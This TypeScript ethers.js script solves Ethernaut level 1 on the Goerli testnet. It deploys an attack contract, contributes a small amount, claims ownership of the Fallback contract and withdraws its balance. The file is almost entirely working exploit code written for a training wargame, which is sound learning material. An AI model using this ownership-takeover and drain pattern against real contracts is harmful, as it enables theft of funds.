import FallbackJSON from "../../../artifacts/contracts/level1/Fallback.sol/Fallback.json"
import AttackJSON from "../../../artifacts/contracts/level1/Attack.sol/fallbackAttack.json"
const ethers = require('ethers');
require ('dotenv').config ()

const provider = new ethers.providers.AlchemyProvider('goerli', process.env.ALCHEMY_API_KEY);
const privateKey: string = process.env.ACTOR_PRIVATE_KEY as string;
const fallbackContractAddress: string = '0x1AF39FF884d7F02b6046df07Cf3Cd614D2545820';



// Define all function calls used
async function main(){
  console.log(`Ethernaut level 1 - script made by JoVi\n ------ \n`);
  const wallet = await new ethers.Wallet( privateKey, provider);
  const signer = wallet.connect(provider);
  const fallbackContract = new ethers.Contract(fallbackContractAddress, FallbackJSON.abi, signer);
  const attackContractInterface = new ethers.ContractFactory(AttackJSON.abi, AttackJSON.bytecode, signer);

  const deploymentValue = '10000000000000000'
  
  // deploy new attack contract
  console.log(`Deploying attack contract with: ${deploymentValue} wei.\n ------ \n`)
  const attackContract = await attackContractInterface.deploy( fallbackContractAddress,
    {value: deploymentValue}
  );
  
  console.log(`Attack contract succesfully deployed at address ${attackContract.address}\n ------ \n`);

  console.log(`Attempting to push contribute transaction.\n ------ \n`);
  const cContractTx = await attackContract.contribute({value: 150000000000000, gasLimit: 500000});
  const cContractTxReceipt = await cContractTx.wait();
  console.log(`Contribuition succesfull\n ------ \n`);

  console.log(`Attempting to push attack transaction.\n ------ \n`);
  const attackContractTx = await attackContract.claimOwnership({value: 1500000000000000, gasLimit: 500000});
  const attackContractTxReceipt = await attackContractTx.wait();

  console.log(`Attack attempt succesfull.\n ------ \n`);

  const withdrawTx = await attackContract.withdraw({gasLimit: 500000});
  const withdrawTxReceipt = await withdrawTx.wait();
  console.log(`Withdraw attempt succesfull.\n ------ \n`);
 
  
}


// Execute
main();